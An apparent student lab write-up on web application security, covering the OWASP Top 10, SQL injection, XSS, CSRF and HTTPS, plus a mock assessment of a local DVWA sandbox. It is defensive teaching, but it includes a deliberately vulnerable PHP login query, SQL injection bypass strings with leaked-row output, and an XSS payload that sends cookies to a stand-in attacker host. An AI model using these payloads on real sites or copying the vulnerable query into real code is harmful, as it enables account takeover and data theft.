# Task 6: Web Application Security Basics

## 1. The OWASP Top 10 Vulnerabilities

The Open Web Application Security Project (OWASP) is a global non-profit organization dedicated to improving software security. The OWASP Top 10 represents a broad consensus on the most critical security risks facing modern web applications.

| Risk Category | Vulnerability Name | Core Explanation |
| :--- | :--- | :--- |
| **A01:2021** | **Broken Access Control** | Applications fail to properly enforce restrictions on what authenticated users are allowed to do, letting attackers access unauthorized accounts, sensitive files, or admin privileges. |
| **A02:2021** | **Cryptographic Failures** | Inadequate protection of sensitive data in transit or at rest (e.g., using plaintext, weak hashing algorithms like MD5, or poorly managed SSL/TLS keys), exposing data to attackers. |
| **A03:2021** | **Injection** | User-supplied data is filtered incorrectly and executed directly by an interpreter (SQL, LDAP, OS command), allowing attackers to execute unauthorized code. |
| **A04:2021** | **Insecure Design** | Security flaws built directly into the architecture and design of the application, which cannot be fixed by simple code patches or configuration tweaks. |
| **A05:2021** | **Security Misconfiguration** | Applications, servers, or cloud environments are left with default settings, unoptimized configurations, open cloud storage, or overly verbose error messages. |
| **A06:2021** | **Vulnerable & Outdated Components** | Development teams fail to track, update, or patch third-party libraries, frameworks, or dependencies that contain publicly known security flaws. |
| **A07:2021** | **Identification & Authentication Failures** | Weaknesses in user identity verification, such as permitting credential stuffing, weak password policies, or insecure session token handling. |
| **A08:2021** | **Software & Data Integrity Failures** | Code and data updates are processed without verifying their integrity (e.g., insecure deserialization or unverified plugins), letting attackers inject malicious payloads. |
| **A09:2021** | **Security Logging & Monitoring Failures** | Failing to log security-critical events or actively monitor active sessions, preventing security teams from detecting, isolating, or responding to live breaches. |
| **A10:2021** | **Server-Side Request Forgery (SSRF)** | A web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to force the application to send crafted requests to internal systems. |

---

## 2. Deep Dive: SQL Injection (SQLi)

### Concept
SQL Injection occurs when an application takes untrusted user input and appends it directly to a database query string without proper sanitization or parameterization. This allows an attacker to manipulate the query structure and execute arbitrary SQL commands.

### Real-World Vulnerable Example (PHP/MySQL)
Consider a backend login script that builds a query dynamic string like this:

```php
$username = $_POST['user'];
$password = $_POST['pass'];
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

If an attacker inputs the following string into the username field: `admin' OR '1'='1`
The database processes the modified string syntax as:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '$password'
```

Because `'1'='1'` evaluates to true unconditionally, the database bypasses the password validation logic entirely and grants administrative access.

### Prevention Strategies
* **Parameterized Queries (Prepared Statements):** Forces the database engine to treat user inputs strictly as literal data variables, never as executable command logic.
* **Input Validation & Allow-listing:** Reject data entries that do not conform to expected structural formats.

#### Lab Step 1: Lab Environment Initialization
<img width="1895" height="860" alt="image" src="https://github.com/user-attachments/assets/1533bb8d-9414-46fe-9d8c-6dc25c513abb" />


#### Lab Step 2: Successful SQL Injection Vulnerability Exploitation
<img width="899" height="555" alt="image" src="https://github.com/user-attachments/assets/4b5b9899-e56e-4e2e-81f2-bc0d4fdaafdf" />


---

## 3. Deep Dive: Cross-Site Scripting (XSS)

### Concept
Cross-Site Scripting occurs when an application includes untrusted user input inside a web page sent to a browser without proper validation or escaping. The browser interprets the text data as live executable script code, running it in the context of the victim's session.

### Technical Types
1. **Reflected XSS:** The malicious script is part of the request sent to the server and is immediately "reflected" back in the HTTP response page (e.g., search fields or error text).
2. **Stored (Persistent) XSS:** The malicious payload is permanently saved by the application server (e.g., inside database forum comments) and executed whenever users view the affected page.
3. **DOM-based XSS:** The vulnerability exists entirely within the client-side JavaScript code, manipulating the browser Document Object Model environment directly.

### Exploit Payload Example
An attacker submits a comment containing a malicious JavaScript payload to a vulnerable message board:

```html
<script>new Image().src="http://attacker.local/log?cookie=" + document.cookie;</script>
```

When another user views this comment, their web browser runs the script automatically, capturing their active session identification cookie and sending it directly to the attacker's server.

### Prevention Strategies
* **Context-Aware Output Encoding:** Convert characters into secure HTML entity formats before rendering them on screen (e.g., turning `<` into `&lt;` and `>` into `&gt;`).
* **Content Security Policy (CSP):** Configure standard HTTP response header rules specifying explicitly trusted domains from which scripts are allowed to execute.

#### Lab Step 3: Cross-Site Scripting Exploitation
<img width="918" height="459" alt="image" src="https://github.com/user-attachments/assets/c4548a45-7278-42b6-ac39-c956cf90c065" />


---

## 4. Key Web Security Vulnerabilities

### Cross-Site Request Forgery (CSRF)
* **Concept:** CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they are currently authenticated. It exploits the trust a site has in the user's browser session.
* **Mechanism:** If a user is logged into their bank web app and visits a malicious site in another tab, that site can trigger a hidden form request to transfer funds. The browser automatically attaches the user's valid session cookies, and the bank processes the unauthorized transaction.
* **Prevention:** Implement unique, cryptographically secure **Anti-CSRF Tokens** associated with individual client sessions.

### Broken Authentication and Session Management
* **Concept:** This occurs when application functions related to user identity validation and session upkeep are implemented incorrectly, allowing actors to compromise active session tokens or brute-force credentials.
* **Prevention:** Enforce mandatory multi-factor authentication (MFA), implement account lockout ceilings, and utilize secure, randomly generated, long-entropy session IDs.

### Security Misconfiguration
* **Concept:** This happens when security hardening controls are unoptimized, incomplete, or completely absent across any layer of the application platform stack.
* **Prevention:** Deactivate unnecessary background services, change factory default credentials immediately, and turn off verbose debug mode logging on live production servers.

---

## 5. Network Layer Defense: How HTTPS Protects Traffic

Hypertext Transfer Protocol Secure (**HTTPS**) utilizes **Transport Layer Security (TLS)** to wrap standard web data transactions inside a secure, encrypted tunnel.

HTTPS safeguards transit data by providing three fundamental protections:
1. **Encryption (Confidentiality):** Obfuscates the plaintext data stream exchanging between browsers and servers to prevent network eavesdroppers from reading credentials or session tokens.
2. **Data Integrity:** Employs cryptographic checksums to ensure data cannot be modified or corrupted mid-transit without triggering an immediate connection failure.
3. **Authentication:** Uses cryptographic Public Key Certificates issued by trusted Certificate Authorities (CAs) to verify the server's identity, ensuring clients are connecting to the legitimate domain.

#### Lab Step 4: Network Traffic Analysis / Mitigation Verification
<img width="816" height="867" alt="image" src="https://github.com/user-attachments/assets/0b9ed725-3da4-434b-80cb-d55a293c72f7" />


---

## 6. Web Application Security Assessment Report

### 1. Executive Summary
* **Target Environment / Scope:** Local DVWA Sandbox Environment (DVWA Security Level: Low)
* **Scan/Testing Date:** 2026-06-12
* **Testing Methodologies:** Manual Code Auditing, Component Mapping, and Context Input Validation Testing
* **Overall Assessment Summary:** The security assessment completed successfully against the local web application deployment. Severe flaws were identified within user authentication interfaces and data reporting inputs. Immediate architectural remediation is required to safeguard session states and data backends.

### 2. Vulnerability Breakdown
| Risk Level | Count | Immediate Action Required |
| :--- | :--- | :--- |
| 🔴 Critical | 1 | Refactor query structure using Parameterized Statements |
| 🟠 High | 1 | Apply context-aware HTML entity encoding on all inputs |
| 🟡 Medium | 1 | Enforce unique Anti-CSRF session token checks |
| 🔵 Informational| 2 | Deactivate default admin access routing logs |

---

### 3. Detailed Technical Findings

#### [Finding ID: WEB-001] | SQL Injection via User ID Input Parameter
* **Target Interface URL:** `http://localhost/DVWA/vulnerabilities/sqli/`
* **Vulnerable Input Vector:** User ID input field (`id` parameter via HTTP GET)
* **Associated CWE Mapping:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
* **Assigned Severity:** 9.8 (Critical)

##### Finding Description
The application backend fails to validate, filter, or parameterize input supplied to the User ID field. Passing a payload containing a single quote closes the internal database command structure prematurely, letting an attacker append raw SQL conditions that alter the logical output of the database query.

##### Proof of Concept (Exploit Vector)
By submitting the payload `%` or `' OR '1'='1`, the underlying engine evaluates the expression as true for every single row in the database, leaking usernames, personal details, and accounts.

```text
User ID: %' OR '1'='1
ID: %' OR '1'='1
First name: admin
Surname: admin

ID: %' OR '1'='1
First name: Gordon
Surname: Brown
```

##### Recommended Remediation Steps
1. **Implement Prepared Statements:** Transition backend logic away from dynamic string generation to native PDO prepared statement configurations.
2. **Input Type Enforcement:** Force the input validator to drop any requests where the user input parameter does not strictly match an integer format.
```
